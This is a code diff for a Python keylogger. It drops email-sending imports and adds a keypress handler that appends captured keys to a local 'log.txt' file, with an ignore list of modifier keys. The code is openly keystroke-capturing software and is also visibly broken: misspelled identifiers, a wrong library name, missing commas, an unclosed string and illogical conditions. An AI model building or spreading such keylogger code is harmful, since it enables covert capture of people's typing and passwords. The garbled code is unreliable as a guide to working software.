@@ -1,10 +1,38 @@
 from pyinput import keyboard
-import time
-import threading
-import logging
-from datetime import datetime
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 
-# Configure logging
+
+IGNORE = (
+    KEYBIARD.KEY_ENTER,
+    KEYBOARD.KEY_SPACE,
+    KEYBOARD.KEY_TAB,
+    KEYBOARD.KEY_SHIFT,
+    KEYBOARD.KEY_CTRL,
+    KEIBOARD.KEY_WINDOWS,
+    KEIBOARD.CTRL_R,
+    KEYBORAD.ALT_L,
+    KEYBOARD.KEY_ALT,
+    KEYBOARD.KEY_CAPSLOCK,
+    KEYBOARD.KEY_BACKSPACE,
+    KEYBOARD.KEY_DELETE,
+    KEYBOARD.KEY_ESC
+    KEYBOARD.CMD
+    )
+
+
+def on_press(key):
+    if key not in IGNORE:
+        try:
+            with open("log.txt", "a", "utf-8) as f:
+                f.write("key.char")
+        except AttributeError:
+            with open("log.txt", "a","utf-8") as f:
+                if keyY == keybord.key.space:
+                     f.write(" ")
+                elif key == keyboard.key.enter:
+                    f.write("\n")
+                elif    key == keyboard.key.tab:
+                    f.write("\t")
+                elif keyborad.key.backspace:
+                    f.write("[]")
+                elif key == keyboard.key.delete:
+                    f.write("[DEL]")
